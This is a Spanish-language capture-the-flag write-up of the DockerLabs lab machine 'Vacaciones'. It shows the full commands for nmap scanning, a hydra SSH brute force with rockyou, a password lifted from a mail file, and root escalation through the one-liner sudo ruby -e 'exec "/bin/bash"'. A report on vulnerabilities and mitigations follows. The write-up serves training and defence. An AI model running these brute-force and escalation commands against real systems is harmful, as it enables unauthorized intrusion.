# Vacaciones

> Un comentario en la web filtra dos usuarios; con hydra saco la contraseña de camilo, un correo interno revela la de juan y escalo a root abusando de un sudo NOPASSWD sobre ruby.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 3 |

**Tags:** `Hydra` · `Fuerza bruta SSH` · `rockyou` · `Fuga de credenciales` · `sudo` · `Ruby` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

La web no tiene contenido visible, pero en su código fuente hay un comentario revelador.

```bash
$ curl -s http://172.17.0.2 | grep "<!--"
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Dos usuarios: **juan** y **camilo**. Voy a por sus contraseñas.

## Fuerza bruta del usuario camilo

```bash
$ hydra -l camilo -P rockyou.txt ssh://172.17.0.2 -t 64
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
```

Entro por SSH con **camilo : password1**.

```bash
$ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: (password1)
$ whoami
camilo
```

## Pivote al usuario juan

El comentario de la web hablaba de un correo. Lo busco en el buzón de camilo.

```bash
$ cat /var/mail/camilo/correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Esa contraseña es la de **juan** (el que se va de vacaciones). Pivoto a su cuenta.

```bash
$ ssh juan@172.17.0.2
juan@172.17.0.2's password: (2k84dicb)
$ whoami
juan
```

## Escalada a root · sudo Ruby

```bash
$ sudo -l
User juan may run the following commands on vacaciones:
    (ALL) NOPASSWD: /usr/bin/ruby
```

juan puede ejecutar `ruby` como root sin contraseña. Según GTFOBins, le pido a Ruby que lance una bash.

```bash
$ sudo ruby -e 'exec "/bin/bash"'
root@vacaciones:~# whoami
root
```

Máquina Vacaciones completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sobre ruby

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** juan puede ejecutar ruby como root sin contraseña; un one-liner le da shell root (GTFOBins).

**Mitigación.** Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre intérpretes (ruby, python, perl...).

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta camilo usa una contraseña de diccionario (password1), accesible por SSH mediante fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave.

### 🟡 MEDIA — Contraseña compartida en texto plano por correo interno

`CWE-312` · A02:2021 – Cryptographic Failures

**Impacto.** Un correo en /var/mail/camilo guarda en claro la contraseña del usuario juan, permitiendo el pivote entre cuentas.

**Mitigación.** Nunca compartir credenciales por correo o en texto plano; usar un gestor de secretos y forzar el cambio en el primer uso.

### ⚪ BAJA — Divulgación de usuarios en el código fuente de la web

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** Un comentario HTML deja ver los nombres de dos usuarios válidos (juan y camilo), que sirven de objetivo para la fuerza bruta.

**Mitigación.** No dejar comentarios con información interna en el HTML que se sirve al público.

---

_Writeup de **Vacaciones** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
